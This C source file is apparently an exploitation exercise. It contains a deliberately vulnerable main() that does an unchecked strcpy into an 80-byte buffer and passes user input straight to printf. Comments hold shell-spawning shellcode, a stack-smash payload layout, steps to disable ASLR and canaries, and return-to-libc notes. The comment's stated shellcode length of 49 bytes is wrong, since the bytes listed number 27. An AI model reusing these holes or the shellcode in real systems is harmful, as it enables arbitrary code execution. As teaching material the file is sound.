#include<stdio.h>
#include<string.h>
/**
Shellcode to be used for this exercise is
--> \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

- This shellcode is 49 bytes long
- So 49 bytes, <padding/Nop sled> , return address to shellcode (Start of buffer)
- Remember to disable aslr, and canaries, and allow stack execution.
- The shellcode should not have any null terminating characters.
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
**/

// /usr/lib32/ld-2.30.so
// examine this linked memory space for library functions
// readelf -s /usr/lib32/ld-2.30.so 
// From the above command you will get the offset. Note that your target exec must have libraries with syscall in them. Then look at the start of the memory, and go to the offset.
// This will be your syscall which will be used to facilitate the "RETURN to libC" exploit.
// This binary unfortunately does not.

main(int argc, char **argv)
{ 
  // Every string in this world is shorter than 80 characters
  char buffer[80];	
  printf("%s",argv[1]);
  //printf("%d\n", strtol(argv[1], NULL, 16));
  strcpy(buffer,argv[1]); 
  return 1;
}

